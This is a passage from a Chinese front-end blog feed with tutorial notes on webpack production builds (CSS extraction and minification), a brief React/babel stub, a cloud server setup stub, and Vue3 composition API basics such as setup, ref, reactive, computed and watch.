title="8.生产模式"></a>8.生产模式</h2><p>生产模式是用于将我们的代码打包部署上线的模式，生产模式的配置代码也需要一个文件保存</p><p>所以我们新建一个文件夹<code>config</code>用于存放配置文件，然后将两个配置文件放入<code>webpack.dev.js</code>和<code>webpack.prod.js</code></p><p>需要注意因为更改了文件目录，所以用到绝对路径的地方（有dirname）的地方需要改动，添加<code>../</code></p><p>而且webpack.prod.js中改为<code>mode:production</code></p><h3 id="8-1快捷方式"><a href="#8-1快捷方式" class="headerlink" title="8.1快捷方式"></a>8.1快捷方式</h3><p>我们使用生产模式下的webpack文件现在需要输入：<code>npx webpack --config .\config\webpack.prod.js</code></p><p>每次都需要输入这个十分麻烦，所以我们在package.json中修改生成快捷方式</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-string">&quot;scripts&quot;</span>: &#123;<br>  <span class="hljs-string">&quot;start&quot;</span>: <span class="hljs-string">&quot;npx run dev&quot;</span>,<br>  <span class="hljs-string">&quot;dev&quot;</span>: <span class="hljs-string">&quot;npx webpack --config .<span class="hljs-subst">\\</span>config<span class="hljs-subst">\\</span>webpack.dev.js&quot;</span>,<br>  <span class="hljs-string">&quot;build&quot;</span>: <span class="hljs-string">&quot;npx webpack --config .<span class="hljs-subst">\\</span>config<span class="hljs-subst">\\</span>webpack.prod.js&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p>以后我们生产模式下打包文件就只需要：<code>npm run build</code></p><h3 id="8-2-mini-css"><a href="#8-2-mini-css" class="headerlink" title="8.2 mini-css"></a>8.2 mini-css</h3><p>我们现在的css代码是打包到js文件中的，也就是解析js的时候才会生成<code>&lt;style&gt;</code>标签，然后在解析css样式</p><p>这样子就会出现<strong>闪屏</strong>现象，也就是css模块最后被加载导致页面闪一下，为了杜绝这种现象我们使用mini-css打包css文件</p><p>安装mini-css:</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">npm install --<span class="hljs-built_in">save</span>-<span class="hljs-built_in">dev</span> mini-css-extract-plugin<br></code></pre></td></tr></table></figure><p>在prod.js中加入mini-css:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>引入mini-css模块<br>const MiniCssExtractPlugin = require(<span class="hljs-string">&quot;mini-css-extract-plugin&quot;</span>);<br><br><span class="hljs-regexp">//</span>rules中loader的配置中将<span class="hljs-string">&quot;style.loader&quot;</span>改为MiniCssExtractPlugin.loader<br>&#123;<br>    test: <span class="hljs-regexp">/\.css$/i</span>,<span class="hljs-regexp">//</span>匹配.css文件<br>    <span class="hljs-regexp">//</span>执行顺序从右到左<br>    use: [MiniCssExtractPlugin.loader, <span class="hljs-string">&quot;css-loader&quot;</span>],<span class="hljs-regexp">//</span>css是将css转换为commonjs放入js，style是将js中的css转换为style标签中的内容<br>&#125;,<br><br><span class="hljs-regexp">//</span>在plugins中加入mini-css 并设置文件目录<br>new MiniCssExtractPlugin(&#123;<br>   filename:<span class="hljs-string">&#x27;static/css/main.css&#x27;</span><br>&#125;)   <br></code></pre></td></tr></table></figure><p>最后：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">npm <span class="hljs-builtin-name">run</span> build<br></code></pre></td></tr></table></figure><p>然后得到<code>dist/static/css</code>目录下的<code>main.css</code>文件</p><p><img src="https://s2.loli.net/2022/06/28/IBYRcLjmp65bha3.png" alt="mini-css.png"></p><p>现在加载css的时候就是通过link标签引入css了，就没有了闪屏现象</p><h3 id="8-3-打包loader"><a href="#8-3-打包loader" class="headerlink" title="8.3  打包loader"></a>8.3  打包loader</h3><p>loader中有大量重复的代码，我们打包loader成函数提高复用性</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>pre就是我们less-loder等loader<br><span class="hljs-keyword">function</span> getStyleLoader(pre) &#123;<br>    return [MiniCssExtractPlugin.loader, <span class="hljs-string">&quot;css-loader&quot;</span>,<br>    &#123;<br>        loader: <span class="hljs-string">&quot;postcss-loader&quot;</span>,<br>        options: &#123;<br>            postcssOptions: &#123;<br>                plugins: [<br>                    <span class="hljs-string">&quot;postcss-preset-env&quot;</span><span class="hljs-regexp">//</span>能解决大多数兼容性问题<br>                ]<br>            &#125;<br>        &#125;<br>    &#125;,<br>    pre,<br>    ].filter(Boolean)<br>&#125;<br><br><span class="hljs-regexp">//</span>less-loader中的演示<br>&#123;<br>   test: <span class="hljs-regexp">/\.less$/i</span>,<span class="hljs-regexp">//</span>匹配.less文件<br>   <span class="hljs-regexp">//</span>执行顺序从右到左<br>   use: getStyleLoader(<span class="hljs-string">&quot;less-loader&quot;</span>),<br>&#125;,<br></code></pre></td></tr></table></figure><h3 id="8-4-css压缩"><a href="#8-4-css压缩" class="headerlink" title="8.4 css压缩"></a>8.4 css压缩</h3><p>我们下载：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">npm install css-minimizer-webpack-plugin --<span class="hljs-built_in">save</span>-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><p>然后在配置文件中：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//压缩css</span><br><span class="hljs-keyword">const</span> CssMinimizerPlugin = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;css-minimizer-webpack-plugin&quot;</span>);<br><br><span class="hljs-comment">//plugins中加入</span><br><span class="hljs-keyword">new</span> CssMinimizerPlugin(),<br></code></pre></td></tr></table></figure><p>再重新打包，得到的main.css文件就是被压缩过的了</p><p>webpack的基本配置就是以上这些了！</p>]]></content>
    
    
    <categories>
      
      <category>webpack</category>
      
    </categories>
    
    
    <tags>
      
      <tag>webpack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>react</title>
    <link href="/2022/06/20/React/"/>
    <url>/2022/06/20/React/</url>
    
    <content type="html"><![CDATA[<h1 id="React"><a href="#React" class="headerlink" title="React"></a>React</h1><h2 id="babel"><a href="#babel" class="headerlink" title="babel"></a>babel</h2><p>babel可以将ES6转换为ES5，但是babel远远不止于此，babel还可以将我们的react中的jsx转换为js代码</p>]]></content>
    
    
    <categories>
      
      <category>react</category>
      
    </categories>
    
    
    <tags>
      
      <tag>react</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Own Server</title>
    <link href="/2022/06/16/%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2022/06/16/%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="个人服务器"><a href="#个人服务器" class="headerlink" title="个人服务器"></a>个人服务器</h1><p>建立个人服务器，大家就可以通过网络浏览你服务器中的内容。你也可以将自己的博客，网页搭到你的个人服务器上进行开发效果的检验。</p><h2 id="1-服务器初始化"><a href="#1-服务器初始化" class="headerlink" title="1.服务器初始化"></a>1.服务器初始化</h2><p>现在的云服务器有很多，除了BAT云外，还有华为云等等的云服务器。我所购买的是腾讯云，基本操作应该还是差不多的。</p><h2 id="1-1-查看服务器"><a href="#1-1-查看服务器" class="headerlink" title="1.1 查看服务器"></a>1.1 查看服务器</h2><p>在购买了服务器之后我们就查看我们的服务器了</p><p><img src="https://s2.loli.net/2022/06/20/zvZsq5MV2OneYAN.png" alt="查看服务器.png"></p><p>点击我们的服务器就可以看到很多基本信息</p><p><img src="https://s2.loli.net/2022/06/20/bOIAsiY4cjQ3gxk.png" alt="查看基本信息.png"></p><p>我们可以点击登录通过webshell操作我们的服务器</p>]]></content>
    
    
    <categories>
      
      <category>server</category>
      
    </categories>
    
    
    <tags>
      
      <tag>服务器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue3</title>
    <link href="/2022/06/06/Vue3/"/>
    <url>/2022/06/06/Vue3/</url>
    
    <content type="html"><![CDATA[<h1 id="Vue3"><a href="#Vue3" class="headerlink" title="Vue3"></a>Vue3</h1><h2 id="1-创建一个vue3项目"><a href="#1-创建一个vue3项目" class="headerlink" title="1.创建一个vue3项目"></a>1.创建一个vue3项目</h2><h3 id="1-1cli创建"><a href="#1-1cli创建" class="headerlink" title="1.1cli创建"></a>1.1cli创建</h3><p>cli创建要求vue版本高于4.5.0，我们可以在cmd中通过<code>vue -V</code>查看</p><p>然后按照脚手架的方式创建：<code>vue create -name</code></p><p>进入之后选择vue3脚手架即可</p><h3 id="1-2-vite创建"><a href="#1-2-vite创建" class="headerlink" title="1.2 vite创建"></a>1.2 vite创建</h3><p>vite是新一代的前端构建工具，由vue团队开发，为了挑战webpack的地位</p><p>vite的速度更快更轻量级，使用vite构建工程的方法如下：</p><p><img src="https://img-blog.csdnimg.cn/bfaf423d6bff48238ebcb67470dfa442.png" alt="vite"></p><p>启动不再是<code>npm run serve</code>而是<code>npm run dev</code></p><p>我们会发现启动快了很多，但是vite是<strong>等你进入网址再进行动态加载页面</strong></p><h2 id="2-vue3结构"><a href="#2-vue3结构" class="headerlink" title="2.vue3结构"></a>2.vue3结构</h2><p>vue3中的<code>main.js</code>中的代码和<code>vue2</code>不同，它使用一个轻量级的app管理组件，提供了挂载和卸载功能</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//引入调用vue的工厂函数 createApp</span><br><span class="hljs-keyword">import</span> &#123; createApp &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./App.vue&#x27;</span><br><br><span class="hljs-comment">// 创建一个app对象，类似于vue2中的vm，但是app更轻</span><br><span class="hljs-keyword">const</span> app = createApp(App)<br><br><span class="hljs-comment">// 挂载</span><br>app.mount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br><br><span class="hljs-comment">// 卸载</span><br>app.unmount(<span class="hljs-string">&#x27;#app&#x27;</span>)<br></code></pre></td></tr></table></figure><p>在组件中：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 可以不再需要一个根标签 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Vue logo&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./assets/logo.png&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">HelloWorld</span> <span class="hljs-attr">msg</span>=<span class="hljs-string">&quot;Welcome to Your Vue.js App&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure><p>tips：我们可以使用#region和#endRegion括住注释的两端，实现折叠功能</p><h2 id="3-composition-API"><a href="#3-composition-API" class="headerlink" title="3.composition API"></a>3.composition API</h2><h3 id="3-1-set-up"><a href="#3-1-set-up" class="headerlink" title="3.1 set up"></a>3.1 set up</h3><p><code>set up</code>是一个配置项，它的值是一个函数，里面存放了数据，方法等（感觉有点像模块化的vuex）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span> &#123;<br>  <span class="hljs-keyword">let</span> name = <span class="hljs-string">&quot;tony&quot;</span>;<br>  <span class="hljs-keyword">let</span> age = <span class="hljs-number">18</span><br><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHello</span>(<span class="hljs-params"></span>) </span>&#123;<br>    alert(<span class="hljs-string">`I am <span class="hljs-subst">$&#123;name&#125;</span>,I am <span class="hljs-subst">$&#123;age&#125;</span> years old`</span>)<br>  &#125;<br><br>  <span class="hljs-comment">// 在setup中数据需要return出去</span><br>  <span class="hljs-keyword">return</span>&#123;<br>    name,<br>    age,<br>    sayHello<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>return出来的数据可以在外部调用，也可以<code>return</code>一个渲染函数<code>render</code></p><p>而且在模板中引用时需要使用this.xxx而不是xxx.value</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我是App组件<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>person:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.name</span>&#125;&#125;</span><span class="xml"> </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.age</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sayHello&quot;</span>&gt;</span>hello<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>注意set up 不要和vue2中的data，method混用，会有优先级的问题</p><p><strong>set up也不能是一个async函数</strong>，被async修饰后我们得到的就是一个promise包裹的对象了，所以被禁止了。</p><p>但是后期我们学习了异步组件之后，异步组件中的setup可以是一个async函数</p><h3 id="3-2-ref"><a href="#3-2-ref" class="headerlink" title="3.2 ref"></a>3.2 ref</h3><p>ref在vue2中是一个属性，而在vue3中是一个函数，用于实现数据响应式</p><p>先引入ref</p><figure class="highlight nim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nim"><span class="hljs-keyword">import</span> &#123; <span class="hljs-keyword">ref</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vue&quot;</span>;<br></code></pre></td></tr></table></figure><p>为了实现ref，我们在定义数据时需要</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">let</span> name = <span class="hljs-keyword">ref</span>(<span class="hljs-string">&quot;tony&quot;</span>)<br><span class="hljs-keyword">let</span> age = <span class="hljs-keyword">ref</span>(<span class="hljs-number">18</span>)<br></code></pre></td></tr></table></figure><p>这样ref将我们的数据转换成了一个对象</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">RefImpl &#123;<span class="hljs-variable">__v_isShallow</span>: <span class="hljs-literal">false</span>, dep: <span class="hljs-built_in">Set</span>(<span class="hljs-number">1</span>), <span class="hljs-variable">__v_isRef</span>: <span class="hljs-literal">true</span>, <span class="hljs-variable">_rawValue</span>: <span class="hljs-string">&#x27;tony&#x27;</span>, <span class="hljs-variable">_value</span>: <span class="hljs-string">&#x27;tony&#x27;</span>&#125;<br>dep: <span class="hljs-built_in">Set</span>(<span class="hljs-number">1</span>) &#123;ReactiveEffect&#125;<br><span class="hljs-variable">__v_isRef</span>: <span class="hljs-literal">true</span><br><span class="hljs-variable">__v_isShallow</span>: <span class="hljs-literal">false</span><br><span class="hljs-variable">_rawValue</span>:<span class="hljs-string">&quot; 李四&quot;</span><br><span class="hljs-variable">_value</span>: <span class="hljs-string">&quot;李四&quot;</span><br>value: <span class="hljs-string">&quot;李四&quot;</span><br></code></pre></td></tr></table></figure><p>我们使用value值就可以调用setter，实现响应式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 设置响应式数据</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">changeHello</span>(<span class="hljs-params"></span>)</span>&#123;<br>      <span class="hljs-built_in">console</span>.log(name);<br>      name.value = <span class="hljs-string">&#x27;李四&#x27;</span>,<br>      age.value = <span class="hljs-number">48</span> <br>    &#125;<br></code></pre></td></tr></table></figure><p>我们还可以使用ref操作对象</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> job = ref(&#123;<br>  <span class="hljs-built_in">type</span>:<span class="hljs-string">&#x27;前端&#x27;</span>,<br>  salary:<span class="hljs-string">&#x27;30k&#x27;</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>但是修改对象中的数据使用的是 <code>   job.value.salary=&#39;60k&#39;</code>，</p><p>因为对象的封装不再是refimpl，而是proxy</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua">Proxy<br><span class="hljs-string">[[Handler]]</span>: Object<br><span class="hljs-string">[[Target]]</span>: Object<br>salary: <span class="hljs-string">&quot;60k&quot;</span><br><span class="hljs-built_in">type</span>: <span class="hljs-string">&quot;前端&quot;</span><br><span class="hljs-string">[[Prototype]: Object</span><br><span class="hljs-string">[[IsRevoked]]: false</span><br></code></pre></td></tr></table></figure><h3 id="3-3-reactive"><a href="#3-3-reactive" class="headerlink" title="3.3 reactive"></a>3.3 reactive</h3><p>reactive适用于管理对象和数组类型的数据，但不能用于管理基本数据类型</p><p>也是将对象封装成一个proxy</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">let</span> job = reactive(&#123;<br>  <span class="hljs-built_in">type</span>:<span class="hljs-string">&#x27;前端&#x27;</span>,<br>  salary:<span class="hljs-string">&#x27;30k&#x27;</span><br>&#125;)<br></code></pre></td></tr></table></figure><p>更改数据的时候只需要</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-class">job</span>.salary</span>=<span class="hljs-string">&#x27;60k&#x27;</span><br><span class="hljs-variable">console.log</span>(<span class="hljs-variable"><span class="hljs-class">job</span></span>)<br></code></pre></td></tr></table></figure><p>我们的ref管理的基本类型数据也可以通过封装成对象中的属性让reactive进行管理</p><p>在vue2中我们的新增和删除要体现在页面上需要使用</p><p>Vue.delete()和Vue.set()或者this.$set()和this.$delete()</p><p>vue3中的响应式，只要是reactive中管理的数据，我们就可以直接使用delete删除</p><p>vue3是通过proxy调用set和get进行数据的更改，deleteProperty实现删除</p><p><img src="https://img-blog.csdnimg.cn/f980aa564e374167936dbf70089df3ba.png" alt="proxy"></p><p>在vue2中我们使用props实现父向子传值，子组件接收需要使用props</p><p>但是如果不使用props，我们也能在vc身上的<code>$attr</code>中看到</p><p>在vue3中setup的执行时间比beforeCreate早</p><p>而且setup中的this是undefined</p><p>setup中的参数第一个是 props第二个是context</p><h4 id="3-3-1使用自定义事件"><a href="#3-3-1使用自定义事件" class="headerlink" title="3.3.1使用自定义事件"></a>3.3.1使用自定义事件</h4><p>vue3中的自定义事件与vue2有区别</p><p>首先向子组件传值</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;setUp <span class="hljs-attribute">user</span>=<span class="hljs-string">&quot;pigeon&quot;</span> <span class="hljs-attribute">pwd</span>=<span class="hljs-string">&quot;123456&quot;</span> @<span class="hljs-attribute">hello</span>=<span class="hljs-string">&quot;hello&quot;</span>&gt;&lt;/setUp&gt;<br></code></pre></td></tr></table></figure><p>然后在子组件接收</p><p>注意与vue2不同vue3中需要使用emits属性获取传入的自定义事件，然后使用context参数（必须是把前面的props写上，因为context是第二个参数）触发传参</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">    emits: [<span class="hljs-string">&#x27;hello&#x27;</span>],<br>    <span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params">prop,context</span>)</span> &#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"></span>)</span>&#123;<br>            context.emit(<span class="hljs-string">&#x27;hello&#x27;</span>,<span class="hljs-number">666</span>)<br>        &#125;<br><br>        <span class="hljs-keyword">return</span>&#123;<br>            hello<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-计算属性与监视"><a href="#4-计算属性与监视" class="headerlink" title="4.计算属性与监视"></a>4.计算属性与监视</h2><h3 id="4-1-computed"><a href="#4-1-computed" class="headerlink" title="4.1 computed"></a>4.1 computed</h3><p>vue3中也可以vue2的计算属性，但是不推荐</p><p>vue3中的计算属性需要引入然后写入在setup中</p><p>我们写一个案例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; reactive, computed &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;setUp&#x27;</span>,<br>    <span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span> &#123;<br>        <span class="hljs-keyword">let</span> person = reactive(&#123;<br>            <span class="hljs-attr">firstName</span> : <span class="hljs-string">&#x27;tony&#x27;</span>,<br>            <span class="hljs-attr">lastName</span> : <span class="hljs-string">&#x27;stake&#x27;</span>,<br>        &#125;)<br><br>        <span class="hljs-comment">// //书写计算属性使用computed-简写形式</span><br>        <span class="hljs-comment">// person.fullName = computed(()=&gt;&#123;</span><br>        <span class="hljs-comment">//     return person.firstName+&#x27;-&#x27;+person.lastName</span><br>        <span class="hljs-comment">// &#125;)</span><br><br>        <span class="hljs-comment">// getter 和setter形式</span><br>        person.fullName = computed(&#123;<br>            <span class="hljs-function"><span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">return</span> person.firstName+<span class="hljs-string">&#x27;-&#x27;</span>+person.lastName<br>            &#125;,<br>            <span class="hljs-function"><span class="hljs-title">set</span>(<span class="hljs-params">newVal</span>)</span>&#123;<br>                <span class="hljs-keyword">const</span> nameArr = newVal.split(<span class="hljs-string">&#x27;-&#x27;</span>)<br>                person.firstName=nameArr[<span class="hljs-number">0</span>]<br>                person.lastName=nameArr[<span class="hljs-number">1</span>]<br>            &#125;<br>        &#125;)<br>        <span class="hljs-keyword">return</span>&#123;<br>            person<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>和vue2一样如果需要修改计算得到的值要把计算属性写成扩写形式，写出set方法</p><h3 id="4-2-监视属性"><a href="#4-2-监视属性" class="headerlink" title="4.2 监视属性"></a>4.2 监视属性</h3><h4 id="ref"><a href="#ref" class="headerlink" title="ref:"></a>ref:</h4><p>对ref使用监视属性监视简单数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; ref, watch &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;setUp&#x27;</span>,<br>    <span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span> &#123;<br>        <span class="hljs-keyword">let</span> sum = ref(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">let</span> msg = ref(<span class="hljs-string">&#x27;hello&#x27;</span>)<br>        <span class="hljs-comment">//watch-情况一</span><br>        <span class="hljs-comment">// watch(sum, (newVal,oldVal)=&gt;&#123;</span><br>        <span class="hljs-comment">//     console.log(&quot;sum改变了&quot;+oldVal+newVal);</span><br>        <span class="hljs-comment">// &#125;)</span><br>        <br>        <span class="hljs-comment">//watch-情况二-监视多个</span><br>        watch([sum, msg], <span class="hljs-function">(<span class="hljs-params">newVal,oldVal</span>)=&gt;</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(oldVal,newVal);<br>        &#125;)<br><br>        <span class="hljs-keyword">return</span>&#123;<br>            sum,<br>            msg<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意情况二的数据，得到的oldVal和newVal是数组</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;hello&#x27;</span>] =&gt; [<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;hello&#x27;</span>]<br></code></pre></td></tr></table></figure><p>当需要打开深度监视和立即监视的时候在后面写配置项</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">watch(sum, <span class="hljs-function"><span class="hljs-params">(oldVal,newVal)</span>=&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;sum改变了&quot;</span>+oldVal+newVal);<br>&#125;,&#123;immediate:<span class="hljs-literal">true</span>, deep:<span class="hljs-literal">true</span>&#125;)<br></code></pre></td></tr></table></figure><h4 id="reactive："><a href="#reactive：" class="headerlink" title="reactive："></a>reactive：</h4><p>reactive操作对象数据</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">个人信息：&lt;input <span class="hljs-attribute">v-model</span>=<span 